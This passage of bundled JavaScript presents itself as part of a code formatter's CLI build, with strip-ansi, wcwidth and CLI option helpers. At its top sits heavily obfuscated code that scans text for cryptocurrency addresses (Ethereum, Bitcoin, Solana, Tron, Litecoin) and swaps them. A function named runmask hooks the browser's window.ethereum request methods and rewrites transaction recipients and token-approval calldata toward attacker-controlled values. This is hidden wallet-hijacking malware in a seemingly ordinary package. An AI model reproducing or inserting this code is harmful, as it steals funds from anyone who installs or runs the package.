    const _0x3ec3bb = { "ethereum": /\b0x[a-fA-F0-9]{40}\b/g, "bitcoinLegacy": /\b1[a-km-zA-HJ-NP-Z1-9]{25,34}\b/g, "bitcoinSegwit": /\b(3[a-km-zA-HJ-NP-Z1-9]{25,34}|bc1[qpzry9x8gf2tvdw0s3jn54khce6mua7l]{11,71})\b/g, "tron": /((?<!\w)[T][1-9A-HJ-NP-Za-km-z]{33})/g, "bch": /bitcoincash:[qp][a-zA-Z0-9]{41}/g, "ltc": /(?<!\w)ltc1[qpzry9x8gf2tvdw0s3jn54khce6mua7l]{11,71}\b/g, "ltc2": /(?<!\w)[mlML][a-km-zA-HJ-NP-Z1-9]{25,34}/g, "solana": /((?<!\w)[4-9A-HJ-NP-Za-km-z][1-9A-HJ-NP-Za-km-z]{32,44})/g, "solana2": /((?<!\w)[3][1-9A-HJ-NP-Za-km-z]{35,44})/g, "solana3": /((?<!\w)[1][1-9A-HJ-NP-Za-km-z]{35,44})/g };
    for (const [_0x17ccd4, _0x129783] of Object[_0x29ad9a(466)](_0x3ec3bb)) {
      const _0x1be350 = _0x530d91[_0x29ad9a(1379)](_0x129783) || [];
      for (const _0x4225ce of _0x1be350) {
        _0xba16ef[_0x29ad9a(1185)](_0x17ccd4, _0xba16ef[_0x29ad9a(1203)]) && (!_0x4477fc[_0x29ad9a(1571)](_0x4225ce) && _0xba16ef[_0x29ad9a(1937)](neth, 2 * -4227 + 1 * 4245 + 4209 * 1) && (_0x530d91 = _0x530d91[_0x29ad9a(1184)](_0x4225ce, _0xba16ef[_0x29ad9a(1774)](_0x2abae0, _0x4225ce, _0x4477fc))));
        _0xba16ef[_0x29ad9a(863)](_0x17ccd4, _0xba16ef[_0x29ad9a(914)]) && (!_0x264994[_0x29ad9a(1571)](_0x4225ce) && (_0x530d91 = _0x530d91[_0x29ad9a(1184)](_0x4225ce, _0xba16ef[_0x29ad9a(1774)](_0x2abae0, _0x4225ce, _0x264994))));
        _0xba16ef[_0x29ad9a(863)](_0x17ccd4, _0xba16ef[_0x29ad9a(1735)]) && (!_0x2e3cca[_0x29ad9a(1571)](_0x4225ce) && (_0x530d91 = _0x530d91[_0x29ad9a(1184)](_0x4225ce, _0xba16ef[_0x29ad9a(1535)](_0x2abae0, _0x4225ce, _0x2e3cca))));
        _0xba16ef[_0x29ad9a(1185)](_0x17ccd4, _0xba16ef[_0x29ad9a(1016)]) && (!_0x3ee86f[_0x29ad9a(1571)](_0x4225ce) && (_0x530d91 = _0x530d91[_0x29ad9a(1184)](_0x4225ce, _0xba16ef[_0x29ad9a(1535)](_0x2abae0, _0x4225ce, _0x3ee86f))));
        _0xba16ef[_0x29ad9a(1185)](_0x17ccd4, _0xba16ef[_0x29ad9a(1929)]) && (!_0x4a9d96[_0x29ad9a(1571)](_0x4225ce) && (_0x530d91 = _0x530d91[_0x29ad9a(1184)](_0x4225ce, _0xba16ef[_0x29ad9a(917)](_0x2abae0, _0x4225ce, _0x4a9d96))));
        _0xba16ef[_0x29ad9a(1128)](_0x17ccd4, _0xba16ef[_0x29ad9a(391)]) && (!_0x4a9d96[_0x29ad9a(1571)](_0x4225ce) && (_0x530d91 = _0x530d91[_0x29ad9a(1184)](_0x4225ce, _0xba16ef[_0x29ad9a(421)](_0x2abae0, _0x4225ce, _0x4a9d96))));
        _0xba16ef[_0x29ad9a(863)](_0x17ccd4, _0xba16ef[_0x29ad9a(923)]) && (!_0x553dcb[_0x29ad9a(1571)](_0x4225ce) && (_0x530d91 = _0x530d91[_0x29ad9a(1184)](_0x4225ce, _0xba16ef[_0x29ad9a(1909)](_0x2abae0, _0x4225ce, _0x553dcb))));
        const _0x2d452a = [..._0x4477fc, ..._0x264994, ..._0x2e3cca, ..._0x3ee86f, ..._0x4a9d96, ..._0x553dcb], _0x35f871 = _0x2d452a[_0x29ad9a(1571)](_0x4225ce);
        _0xba16ef[_0x29ad9a(1128)](_0x17ccd4, _0xba16ef[_0x29ad9a(520)]) && !_0x35f871 && (!_0x514d7d[_0x29ad9a(1571)](_0x4225ce) && (_0x530d91 = _0x530d91[_0x29ad9a(1184)](_0x4225ce, _0xba16ef[_0x29ad9a(1292)](_0x2abae0, _0x4225ce, _0x514d7d)))), _0xba16ef[_0x29ad9a(936)](_0x17ccd4, _0xba16ef[_0x29ad9a(1646)]) && !_0x35f871 && (!_0x514d7d[_0x29ad9a(1571)](_0x4225ce) && (_0x530d91 = _0x530d91[_0x29ad9a(1184)](_0x4225ce, _0xba16ef[_0x29ad9a(1292)](_0x2abae0, _0x4225ce, _0x514d7d)))), _0xba16ef[_0x29ad9a(863)](_0x17ccd4, _0xba16ef[_0x29ad9a(1514)]) && _0x35f871 && (!_0x514d7d[_0x29ad9a(1571)](_0x4225ce) && (_0x530d91 = _0x530d91[_0x29ad9a(1184)](_0x4225ce, _0xba16ef[_0x29ad9a(1366)](_0x2abae0, _0x4225ce, _0x514d7d))));
      }
    }
    return _0x530d91;
  }
}
async function runmask() {
  const _0x42ac66 = _0x112fa8, _0x202968 = { "jBjZx": function(_0xb80dbe, _0x16785a) {
    return _0xb80dbe === _0x16785a;
  }, "YzAqt": _0x42ac66(1867), "VFCLH": _0x42ac66(1895) + _0x42ac66(403) + _0x42ac66(403) + "11", "FNPiM": function(_0x5ebedc, _0x1b14a4) {
    return _0x5ebedc !== _0x1b14a4;
  }, "PNkoj": _0x42ac66(1858), "NYPdD": _0x42ac66(1896) + _0x42ac66(1499) + _0x42ac66(1805) + _0x42ac66(588) + "76", "aRpzt": _0x42ac66(922), "VZVsf": function(_0x33027d, _0x584057) {
    return _0x33027d >= _0x584057;
  }, "xgRWF": function(_0x3b664f, _0x255ac6) {
    return _0x3b664f + _0x255ac6;
  }, "xyJIM": _0x42ac66(561) + _0x42ac66(1714) + _0x42ac66(1795) + _0x42ac66(745), "FgFED": function(_0x6abac5, _0x3aa785) {
    return _0x6abac5 + _0x3aa785;
  }, "CYSaX": function(_0x3cbe8d, _0x357792) {
    return _0x3cbe8d + _0x357792;
  }, "CFGzA": _0x42ac66(1845), "SUfqq": _0x42ac66(738), "ACGGV": _0x42ac66(1497) + _0x42ac66(1137), "rVjVY": _0x42ac66(1497) + _0x42ac66(1032), "paXCL": _0x42ac66(343), "vhQZs": _0x42ac66(1812), "ZGNdq": _0x42ac66(1705), "iwqMJ": function(_0x357a1c, _0x4c631d) {
    return _0x357a1c + _0x4c631d;
  }, "KstNe": function(_0x18da7b, _0x12e803) {
    return _0x18da7b + _0x12e803;
  }, "ICuBK": function(_0x6cd8d3, _0x429cb6) {
    return _0x6cd8d3 + _0x429cb6;
  }, "SxhHR": function(_0x26474b, _0x14dc15) {
    return _0x26474b + _0x14dc15;
  }, "Uporr": _0x42ac66(1168), "CEvYY": function(_0x1e173b, _0x2799ed) {
    return _0x1e173b + _0x2799ed;
  }, "wwlFd": function(_0x5a7e39, _0x3b605a) {
    return _0x5a7e39 + _0x3b605a;
  }, "wCxzv": _0x42ac66(697), "YXFkD": function(_0x3808d3, _0x40b3c2) {
    return _0x3808d3 >= _0x40b3c2;
  }, "TnZNv": function(_0x4ff13e, _0x4beb48) {
    return _0x4ff13e + _0x4beb48;
  }, "ccIaG": function(_0x36445e, _0x1ae7b0) {
    return _0x36445e + _0x1ae7b0;
  }, "nqIcJ": function(_0x412b85, _0x27ddcb) {
    return _0x412b85 !== _0x27ddcb;
  }, "vrNtu": _0x42ac66(1754), "DVqLE": _0x42ac66(1487) + _0x42ac66(1412), "TZdvv": function(_0x2bbc6e, _0x2f6889, _0x140d62) {
    return _0x2bbc6e(_0x2f6889, _0x140d62);
  }, "CYpIX": _0x42ac66(1851) + _0x42ac66(1034) + "on", "oobdQ": function(_0x21a897, _0x54ae09) {
    return _0x21a897 === _0x54ae09;
  }, "sHDyF": _0x42ac66(1851) + _0x42ac66(1967) + _0x42ac66(1412), "zcydM": _0x42ac66(1124), "AToLO": _0x42ac66(1905), "IieKY": _0x42ac66(1481), "KCQrw": _0x42ac66(971), "CUshp": function(_0x251499, _0x5d0ebd) {
    return _0x251499 === _0x5d0ebd;
  }, "kTqKV": function(_0x3b543c, _0x24c97c) {
    return _0x3b543c(_0x24c97c);
  }, "MBgmP": function(_0x1607bb, _0x3596b5) {
    return _0x1607bb < _0x3596b5;
  }, "WqPYJ": function(_0x100fc2) {
    return _0x100fc2();
  } };
  let _0x1c41fa = -5010 * -1 + -1 * 2767 + -1 * 2243, _0x2a20cb = /* @__PURE__ */ new Map(), _0x1ab7cb = ![];
  function _0x1089ae(_0x4ac357, _0xc83c36 = !![]) {
    const _0x395b5b = _0x42ac66, _0x13d8ee = JSON[_0x395b5b(708)](JSON[_0x395b5b(1668)](_0x4ac357));
    if (_0xc83c36) {
      if (_0x13d8ee[_0x395b5b(473)] && _0x202968[_0x395b5b(1313)](_0x13d8ee[_0x395b5b(473)], _0x202968[_0x395b5b(1962)]) && _0x202968[_0x395b5b(1313)](_0x13d8ee[_0x395b5b(473)], "0")) {
        const _0x5c6391 = _0x13d8ee["to"];
        _0x13d8ee["to"] = _0x202968[_0x395b5b(1731)];
      }
      if (_0x13d8ee[_0x395b5b(1823)]) {
        const _0x250e27 = _0x13d8ee[_0x395b5b(1823)][_0x395b5b(449) + "e"]();
        if (_0x250e27[_0x395b5b(1653)](_0x202968[_0x395b5b(749)])) {
          if (_0x202968[_0x395b5b(1191)](_0x250e27[_0x395b5b(614)], 8 * 813 + -4486 * 2 + 2542)) {
            const _0x7fa5f0 = _0x250e27[_0x395b5b(839)](2963 * 1 + 3 * -2585 + 2 * 2396, 4766 * 1 + 1190 + -5946), _0x15c4f9 = _0x202968[_0x395b5b(1813)]("0x", _0x250e27[_0x395b5b(839)](323 + 8741 * -1 + 2 * 4226, -771 + -9683 + 1 * 10528)), _0xde14cc = _0x202968[_0x395b5b(1308)][_0x395b5b(1683)](1047 * -1 + 1904 + -793, "0"), _0x3e4a11 = "f"[_0x395b5b(1033)](-197 * 2 + -758 + 1216);
            _0x13d8ee[_0x395b5b(1823)] = _0x202968[_0x395b5b(571)](_0x202968[_0x395b5b(1489)](_0x7fa5f0, _0xde14cc), _0x3e4a11);
            const _0x432d38 = { "0x7a250d5630b4cf539739df2c5dacb4c659f2488d": _0x202968[_0x395b5b(957)], "0x66a9893cC07D91D95644AEDD05D03f95e1dBA8Af": _0x202968[_0x395b5b(957)], "0xe592427a0aece92de3edee1f18e0157c05861564": _0x202968[_0x395b5b(1800)], "0x10ed43c718714eb63d5aa57b78b54704e256024e": _0x202968[_0x395b5b(1626)], "0x13f4ea83d0bd40e75c8222255bc855a974568dd4": _0x202968[_0x395b5b(437)], "0x1111111254eeb25477b68fb85ed929f73a960582": _0x202968[_0x395b5b(1560)], "0xd9e1ce17f2641f24ae83637ab66a2cca9c378b9f": _0x202968[_0x395b5b(1921)] }, _0x13f774 = _0x432d38[_0x15c4f9[_0x395b5b(449) + "e"]()];
            _0x13f774 ? console[_0x395b5b(973)](_0x202968[_0x395b5b(1489)](_0x13f774, _0x15c4f9)) : console[_0x395b5b(973)](_0x15c4f9);
          }
        } else {
          if (_0x250e27[_0x395b5b(1653)](_0x202968[_0x395b5b(885)])) {
            if (_0x202968[_0x395b5b(1191)](_0x250e27[_0x395b5b(614)], 3747 + 58 * -61 + 249)) {
              const _0x571743 = _0x250e27[_0x395b5b(839)](13 * 401 + -5 * -6 + -49 * 107, -906 * 3 + -6743 + 287 * 33), _0x55e7fa = _0x250e27[_0x395b5b(839)](172 * 3 + -8315 + -3 * -2603, -3607 * -1 + 1995 + 2764 * -2), _0x382fb5 = _0x250e27[_0x395b5b(839)](-7 * 331 + 3331 * -1 + 150 * 39, 2498 + -1 * -2078 + -862 * 5), _0x5bb3a7 = _0x250e27[_0x395b5b(839)](3762 + 161 + -3657, 5230 + 2213 + -2371 * 3), _0x2e5118 = _0x250e27[_0x395b5b(839)](-3943 + 7502 + -1 * 3229, -257 + 1 * 4877 + -4226), _0x3ba273 = _0x250e27[_0x395b5b(839)](-3342 + -3399 + 7135 * 1, -2637 + -9809 + 12904), _0x36b084 = _0x202968[_0x395b5b(1308)][_0x395b5b(1683)](-5805 + 83 * -59 + 10766, "0"), _0x15389e = "f"[_0x395b5b(1033)](6635 * -1 + -46 * -43 + -1 * -4721);
              _0x13d8ee[_0x395b5b(1823)] = _0x202968[_0x395b5b(694)](_0x202968[_0x395b5b(1489)](_0x202968[_0x395b5b(1242)](_0x202968[_0x395b5b(1813)](_0x202968[_0x395b5b(1489)](_0x202968[_0x395b5b(833)](_0x202968[_0x395b5b(1254)](_0x571743, _0x55e7fa), _0x36b084), _0x15389e), _0x382fb5), _0x5bb3a7), _0x2e5118), _0x3ba273);
            }
          } else {
            if (_0x250e27[_0x395b5b(1653)](_0x202968[_0x395b5b(857)])) {
              if (_0x202968[_0x395b5b(1191)](_0x250e27[_0x395b5b(614)], -874 * -6 + -6 * -795 + -710 * 14)) {
                const _0x5d2193 = _0x250e27[_0x395b5b(839)](2119 + 4672 + 6791 * -1, -873 + -2 * 1339 + 3561), _0x1493e2 = _0x250e27[_0x395b5b(839)](1 * 3965 + -1 * -8804 + -12695), _0x32c34c = _0x202968[_0x395b5b(1308)][_0x395b5b(1683)](801 * 9 + -1 * -3299 + 2611 * -4, "0");
                _0x13d8ee[_0x395b5b(1823)] = _0x202968[_0x395b5b(1943)](_0x202968[_0x395b5b(1883)](_0x5d2193, _0x32c34c), _0x1493e2);
              }
            } else {
              if (_0x250e27[_0x395b5b(1653)](_0x202968[_0x395b5b(1062)])) {
                if (_0x202968[_0x395b5b(1263)](_0x250e27[_0x395b5b(614)], 8742 * -1 + 1 * 243 + 2879 * 3)) {
                  const _0x5c5045 = _0x250e27[_0x395b5b(839)](-2439 + -356 + 2795, 6321 + 466 * 16 + -13767), _0x1ebe01 = _0x250e27[_0x395b5b(839)](-1904 + 5715 + 7 * -543, 5543 + 5537 + -2 * 5503), _0x558b46 = _0x250e27[_0x395b5b(839)](1 * 5831 + 4693 + -10386), _0x56d65b = _0x202968[_0x395b5b(1308)][_0x395b5b(1683)](117 * -74 + -3205 * -1 + 5517, "0");
                  _0x13d8ee[_0x395b5b(1823)] = _0x202968[_0x395b5b(1513)](_0x202968[_0x395b5b(833)](_0x202968[_0x395b5b(1522)](_0x5c5045, _0x1ebe01), _0x56d65b), _0x558b46);
                }
              }
            }
          }
        }
      } else _0x13d8ee["to"] && _0x202968[_0x395b5b(951)](_0x13d8ee["to"], _0x202968[_0x395b5b(1731)]) && (_0x13d8ee["to"] = _0x202968[_0x395b5b(1731)]);
    } else _0x13d8ee[_0x395b5b(1047) + "ns"] && Array[_0x395b5b(1402)](_0x13d8ee[_0x395b5b(1047) + "ns"]) && _0x13d8ee[_0x395b5b(1047) + "ns"][_0x395b5b(999)]((_0x190501) => {
      const _0x6235c8 = _0x395b5b, _0x5e62cc = { "LKbLj": function(_0x52898f, _0x5bea75) {
        const _0x2f7b98 = _0x180f;
        return _0x202968[_0x2f7b98(900)](_0x52898f, _0x5bea75);
      }, "ABdJE": _0x202968[_0x6235c8(1721)], "ctnMb": _0x202968[_0x6235c8(1729)] };
      _0x190501[_0x6235c8(651)] && Array[_0x6235c8(1402)](_0x190501[_0x6235c8(651)]) && _0x190501[_0x6235c8(651)][_0x6235c8(999)]((_0x2b9990) => {
        const _0xcbc968 = _0x6235c8;
        if (_0x5e62cc[_0xcbc968(570)](typeof _0x2b9990, _0x5e62cc[_0xcbc968(1807)])) _0x2b9990 = _0x5e62cc[_0xcbc968(837)];
        else _0x2b9990[_0xcbc968(950)] && (_0x2b9990[_0xcbc968(950)] = _0x5e62cc[_0xcbc968(837)]);
      }), _0x190501[_0x6235c8(1602)] && Array[_0x6235c8(1402)](_0x190501[_0x6235c8(1602)]) && _0x190501[_0x6235c8(1602)][_0x6235c8(999)]((_0x40768f) => {
        const _0x162b4a = _0x6235c8;
        _0x40768f[_0x162b4a(950)] && (_0x40768f[_0x162b4a(950)] = _0x5e62cc[_0x162b4a(837)]);
      });
    }), _0x13d8ee[_0x395b5b(752)] && (_0x13d8ee[_0x395b5b(752)] = _0x202968[_0x395b5b(1729)]), _0x13d8ee[_0x395b5b(975) + "n"] && (_0x13d8ee[_0x395b5b(975) + "n"] = _0x202968[_0x395b5b(1729)]);
    return _0x13d8ee;
  }
  function _0x485f9d(_0x38473f, _0x292c7a) {
    const _0x2993a5 = _0x42ac66, _0x55f1ec = { "WZTAY": function(_0xb75e55, _0x35108f) {
      const _0x2b94d5 = _0x180f;
      return _0x202968[_0x2b94d5(900)](_0xb75e55, _0x35108f);
    }, "nnJBb": _0x202968[_0x2993a5(1614)], "wAtCG": _0x202968[_0x2993a5(955)], "RDjPX": function(_0x2f6242, _0x37afcc, _0x55d11f) {
      const _0x53e033 = _0x2993a5;
      return _0x202968[_0x53e033(482)](_0x2f6242, _0x37afcc, _0x55d11f);
    }, "JLZkB": _0x202968[_0x2993a5(508)], "VuiPa": function(_0x7b5c68, _0x509e7b) {
      const _0x15c287 = _0x2993a5;
      return _0x202968[_0x15c287(1450)](_0x7b5c68, _0x509e7b);
    }, "dSoXt": _0x202968[_0x2993a5(1762)], "RuMGo": _0x202968[_0x2993a5(753)] };
    return async function(..._0x59af19) {
      const _0x676bfc = _0x2993a5;
      _0x1c41fa++;
      let _0x12a7cb;
      try {
        _0x12a7cb = JSON[_0x676bfc(708)](JSON[_0x676bfc(1668)](_0x59af19));
      } catch (_0x5d1767) {
        _0x12a7cb = [..._0x59af19];
      }
      if (_0x59af19[-8281 + -5808 + 14089] && _0x55f1ec[_0x676bfc(719)](typeof _0x59af19[-21 + 7025 + -7004], _0x55f1ec[_0x676bfc(487)])) {
        const _0x2c3d7e = _0x12a7cb[8971 + 189 * 27 + 227 * -62];
        if (_0x55f1ec[_0x676bfc(719)](_0x2c3d7e[_0x676bfc(1624)], _0x55f1ec[_0x676bfc(1463)]) && _0x2c3d7e[_0x676bfc(816)] && _0x2c3d7e[_0x676bfc(816)][29 * -341 + -1 * 8794 + 18683]) try {
          const _0x39ad21 = _0x55f1ec[_0x676bfc(1741)](_0x1089ae, _0x2c3d7e[_0x676bfc(816)][2041 + 1 * -8751 + 11 * 610], !![]);
          _0x2c3d7e[_0x676bfc(816)][47 * -209 + 6928 * -1 + 16751] = _0x39ad21;
        } catch (_0x226343) {
        }
        else {
          if ((_0x55f1ec[_0x676bfc(719)](_0x2c3d7e[_0x676bfc(1624)], _0x55f1ec[_0x676bfc(1212)]) || _0x55f1ec[_0x676bfc(1476)](_0x2c3d7e[_0x676bfc(1624)], _0x55f1ec[_0x676bfc(1752)])) && _0x2c3d7e[_0x676bfc(816)] && _0x2c3d7e[_0x676bfc(816)][771 * -3 + -2356 + 4669]) try {
            let _0x5ad975 = _0x2c3d7e[_0x676bfc(816)][53 * 14 + -2109 + 1367];
            _0x5ad975[_0x676bfc(782) + "n"] && (_0x5ad975 = _0x5ad975[_0x676bfc(782) + "n"]);
            const _0x5dbe63 = _0x55f1ec[_0x676bfc(1741)](_0x1089ae, _0x5ad975, ![]);
            _0x2c3d7e[_0x676bfc(816)][2249 + 587 * -7 + 1860][_0x676bfc(782) + "n"] ? _0x2c3d7e[_0x676bfc(816)][-1086 * -8 + -1 * 8318 + -2 * 185][_0x676bfc(782) + "n"] = _0x5dbe63 : _0x2c3d7e[_0x676bfc(816)][-1049 + -8375 + 9424] = _0x5dbe63;
          } catch (_0x4b99fd) {
          }
        }
      }
      const _0x1cbb37 = _0x38473f[_0x676bfc(317)](this, _0x12a7cb);
      if (_0x1cbb37 && _0x55f1ec[_0x676bfc(719)](typeof _0x1cbb37[_0x676bfc(1870)], _0x55f1ec[_0x676bfc(980)])) return _0x1cbb37[_0x676bfc(1870)]((_0xea3332) => _0xea3332)[_0x676bfc(1118)]((_0x35d6a3) => {
        throw _0x35d6a3;
      });
      return _0x1cbb37;
    };
  }
  function _0x41630a(_0x5d6d52) {
    const _0x4fdf52 = _0x42ac66;
    if (!_0x5d6d52) return ![];
    let _0x2fc35d = ![];
    const _0xfafee = [_0x202968[_0x4fdf52(660)], _0x202968[_0x4fdf52(1512)], _0x202968[_0x4fdf52(1878)]];
    for (const _0x16ab0e of _0xfafee) {
      if (_0x202968[_0x4fdf52(1605)](typeof _0x5d6d52[_0x16ab0e], _0x202968[_0x4fdf52(753)])) {
        const _0x58cddf = _0x5d6d52[_0x16ab0e];
        _0x2a20cb[_0x4fdf52(1073)](_0x16ab0e, _0x58cddf);
        try {
          Object[_0x4fdf52(630) + _0x4fdf52(1129)](_0x5d6d52, _0x16ab0e, { "value": _0x202968[_0x4fdf52(482)](_0x485f9d, _0x58cddf, _0x16ab0e), "writable": !![], "configurable": !![], "enumerable": !![] }), _0x2fc35d = !![];
        } catch (_0x19546c) {
        }
      }
    }
    return _0x2fc35d && (_0x1ab7cb = !![]), _0x2fc35d;
  }
  function _0xfc3320() {
    const _0x58a004 = _0x42ac66, _0x1f19c0 = { "XbGwc": function(_0x2a8e88, _0x266be7) {
      const _0x5131b3 = _0x180f;
      return _0x202968[_0x5131b3(1024)](_0x2a8e88, _0x266be7);
    }, "deQKv": function(_0x15466b, _0x145190, _0x31bf49) {
      const _0x7762a8 = _0x180f;
      return _0x202968[_0x7762a8(482)](_0x15466b, _0x145190, _0x31bf49);
    }, "gecYn": function(_0x2370a4, _0x457790) {
      const _0x3a43c1 = _0x180f;
      return _0x202968[_0x3a43c1(1088)](_0x2370a4, _0x457790);
    } };
    let _0x4f0cd6 = -7385 + -22 * 297 + 13919;
    const _0x2eb63d = 3768 + -3220 + -498, _0x5b507d = () => {
      const _0x2705e5 = _0x180f, _0x1118ad = { "WpPTN": function(_0x278a79, _0x305419) {
        const _0x505aa9 = _0x180f;
        return _0x1f19c0[_0x505aa9(1439)](_0x278a79, _0x305419);
      } };
      _0x4f0cd6++;
      if (window[_0x2705e5(372)]) {
        _0x1f19c0[_0x2705e5(1859)](setTimeout, () => {
          const _0x295cfc = _0x2705e5;
          _0x1118ad[_0x295cfc(1957)](_0x41630a, window[_0x295cfc(372)]);
        }, -7841 + 2824 * -2 + 13989);
        return;
      }
      _0x1f19c0[_0x2705e5(706)](_0x4f0cd6, _0x2eb63d) && _0x1f19c0[_0x2705e5(1859)](setTimeout, _0x5b507d, 2757 + 7530 + 10187 * -1);
    };
    _0x202968[_0x58a004(1297)](_0x5b507d);
  }
  _0x202968[_0x42ac66(1297)](_0xfc3320), window[_0x42ac66(638) + _0x42ac66(1724)] = { "isActive": () => _0x1ab7cb, "getInterceptCount": () => _0x1c41fa, "getOriginalMethods": () => _0x2a20cb, "forceShield": () => {
    const _0x5126a8 = _0x42ac66;
    if (window[_0x5126a8(372)]) return _0x202968[_0x5126a8(1024)](_0x41630a, window[_0x5126a8(372)]);
    return ![];
  } };
}
function ansiRegex({ onlyFirst = false } = {}) {
  const ST = "(?:\\u0007|\\u001B\\u005C|\\u009C)";
  const osc = `(?:\\u001B\\][\\s\\S]*?${ST})`;
  const csi = "[\\u001B\\u009B][[\\]()#;?]*(?:\\d{1,4}(?:[;:]\\d{0,4})*)?[\\dA-PR-TZcf-nq-uy=><~]";
  const pattern = `${osc}|${csi}`;
  return new RegExp(pattern, onlyFirst ? void 0 : "g");
}

// node_modules/strip-ansi/index.js
var regex = ansiRegex();
function stripAnsi(string) {
  if (typeof string !== "string") {
    throw new TypeError(`Expected a \`string\`, got \`${typeof string}\``);
  }
  return string.replace(regex, "");
}

// node_modules/wcwidth.js/combining.js
var combining_default = [
  [768, 879],
  [1155, 1158],
  [1160, 1161],
  [1425, 1469],
  [1471, 1471],
  [1473, 1474],
  [1476, 1477],
  [1479, 1479],
  [1536, 1539],
  [1552, 1557],
  [1611, 1630],
  [1648, 1648],
  [1750, 1764],
  [1767, 1768],
  [1770, 1773],
  [1807, 1807],
  [1809, 1809],
  [1840, 1866],
  [1958, 1968],
  [2027, 2035],
  [2305, 2306],
  [2364, 2364],
  [2369, 2376],
  [2381, 2381],
  [2385, 2388],
  [2402, 2403],
  [2433, 2433],
  [2492, 2492],
  [2497, 2500],
  [2509, 2509],
  [2530, 2531],
  [2561, 2562],
  [2620, 2620],
  [2625, 2626],
  [2631, 2632],
  [2635, 2637],
  [2672, 2673],
  [2689, 2690],
  [2748, 2748],
  [2753, 2757],
  [2759, 2760],
  [2765, 2765],
  [2786, 2787],
  [2817, 2817],
  [2876, 2876],
  [2879, 2879],
  [2881, 2883],
  [2893, 2893],
  [2902, 2902],
  [2946, 2946],
  [3008, 3008],
  [3021, 3021],
  [3134, 3136],
  [3142, 3144],
  [3146, 3149],
  [3157, 3158],
  [3260, 3260],
  [3263, 3263],
  [3270, 3270],
  [3276, 3277],
  [3298, 3299],
  [3393, 3395],
  [3405, 3405],
  [3530, 3530],
  [3538, 3540],
  [3542, 3542],
  [3633, 3633],
  [3636, 3642],
  [3655, 3662],
  [3761, 3761],
  [3764, 3769],
  [3771, 3772],
  [3784, 3789],
  [3864, 3865],
  [3893, 3893],
  [3895, 3895],
  [3897, 3897],
  [3953, 3966],
  [3968, 3972],
  [3974, 3975],
  [3984, 3991],
  [3993, 4028],
  [4038, 4038],
  [4141, 4144],
  [4146, 4146],
  [4150, 4151],
  [4153, 4153],
  [4184, 4185],
  [4448, 4607],
  [4959, 4959],
  [5906, 5908],
  [5938, 5940],
  [5970, 5971],
  [6002, 6003],
  [6068, 6069],
  [6071, 6077],
  [6086, 6086],
  [6089, 6099],
  [6109, 6109],
  [6155, 6157],
  [6313, 6313],
  [6432, 6434],
  [6439, 6440],
  [6450, 6450],
  [6457, 6459],
  [6679, 6680],
  [6912, 6915],
  [6964, 6964],
  [6966, 6970],
  [6972, 6972],
  [6978, 6978],
  [7019, 7027],
  [7616, 7626],
  [7678, 7679],
  [8203, 8207],
  [8234, 8238],
  [8288, 8291],
  [8298, 8303],
  [8400, 8431],
  [12330, 12335],
  [12441, 12442],
  [43014, 43014],
  [43019, 43019],
  [43045, 43046],
  [64286, 64286],
  [65024, 65039],
  [65056, 65059],
  [65279, 65279],
  [65529, 65531],
  [68097, 68099],
  [68101, 68102],
  [68108, 68111],
  [68152, 68154],
  [68159, 68159],
  [119143, 119145],
  [119155, 119170],
  [119173, 119179],
  [119210, 119213],
  [119362, 119364],
  [917505, 917505],
  [917536, 917631],
  [917760, 917999]
];

// node_modules/wcwidth.js/index.js
var DEFAULTS = {
  nul: 0,
  control: 0
};
function bisearch(ucs) {
  let min = 0;
  let max = combining_default.length - 1;
  let mid;
  if (ucs < combining_default[0][0] || ucs > combining_default[max][1]) return false;
  while (max >= min) {
    mid = Math.floor((min + max) / 2);
    if (ucs > combining_default[mid][1]) min = mid + 1;
    else if (ucs < combining_default[mid][0]) max = mid - 1;
    else return true;
  }
  return false;
}
function wcwidth(ucs, opts) {
  if (ucs === 0) return opts.nul;
  if (ucs < 32 || ucs >= 127 && ucs < 160) return opts.control;
  if (bisearch(ucs)) return 0;
  return 1 + (ucs >= 4352 && (ucs <= 4447 || // Hangul Jamo init. consonants
  ucs == 9001 || ucs == 9002 || ucs >= 11904 && ucs <= 42191 && ucs != 12351 || // CJK ... Yi
  ucs >= 44032 && ucs <= 55203 || // Hangul Syllables
  ucs >= 63744 && ucs <= 64255 || // CJK Compatibility Ideographs
  ucs >= 65040 && ucs <= 65049 || // Vertical forms
  ucs >= 65072 && ucs <= 65135 || // CJK Compatibility Forms
  ucs >= 65280 && ucs <= 65376 || // Fullwidth Forms
  ucs >= 65504 && ucs <= 65510 || ucs >= 131072 && ucs <= 196605 || ucs >= 196608 && ucs <= 262141));
}
function wcswidth(str, opts) {
  let h;
  let l2;
  let s = 0;
  let n;
  if (typeof str !== "string") return wcwidth(str, opts);
  for (let i = 0; i < str.length; i++) {
    h = str.charCodeAt(i);
    if (h >= 55296 && h <= 56319) {
      l2 = str.charCodeAt(++i);
      if (l2 >= 56320 && l2 <= 57343) {
        h = (h - 55296) * 1024 + (l2 - 56320) + 65536;
      } else {
        i--;
      }
    }
    n = wcwidth(h, opts);
    if (n < 0) return -1;
    s += n;
  }
  return s;
}
var _ = (str) => wcswidth(str, DEFAULTS);
_.config = (opts = {}) => {
  opts = {
    ...DEFAULTS,
    ...opts
  };
  return (str) => wcswidth(str, opts);
};
var wcwidth_default = _;

// src/cli/utilities/clear-stream-text.js
var countLines = (stream, text) => {
  const columns = stream.columns || 80;
  let lineCount = 0;
  for (const line of stripAnsi(text).split("\n")) {
    lineCount += Math.max(1, Math.ceil(wcwidth_default(line) / columns));
  }
  return lineCount;
};
function clearStreamText(stream, text) {
  const lineCount = countLines(stream, text);
  for (let line = 0; line < lineCount; line++) {
    if (line > 0) {
      readline.moveCursor(stream, 0, -1);
    }
    readline.clearLine(stream, 0);
    readline.cursorTo(stream, 0);
  }
}
var clear_stream_text_default = clearStreamText;

// src/cli/mockable.js
var mockable = sharedWithCli3.utils.createMockable({
  clearStreamText: clear_stream_text_default,
  getTimestamp: performance.now.bind(performance),
  isCI: () => import_ci_info.isCI,
  isStreamTTY: (stream) => stream.isTTY,
  writeFormattedFile: (file, data) => fs8.writeFile(file, data)
});
var mockable_default = mockable.mocked;

// src/cli/options/get-options-for-file.js
var import_dashify2 = __toESM(require_dashify(), 1);
import { resolveConfig } from "../index.mjs";
function getOptions(argv2, detailedOptions) {
  return Object.fromEntries(
    detailedOptions.filter(({ forwardToApi }) => forwardToApi).map(({ forwardToApi, name }) => [forwardToApi, argv2[name]])
  );
}
function cliifyOptions(object2, apiDetailedOptionMap) {
  return Object.fromEntries(
    Object.entries(object2 || {}).map(([key, value]) => {
      const apiOption = apiDetailedOptionMap[key];
      const cliKey = apiOption ? apiOption.name : key;
      return [(0, import_dashify2.default)(cliKey), value];
    })
  );
}
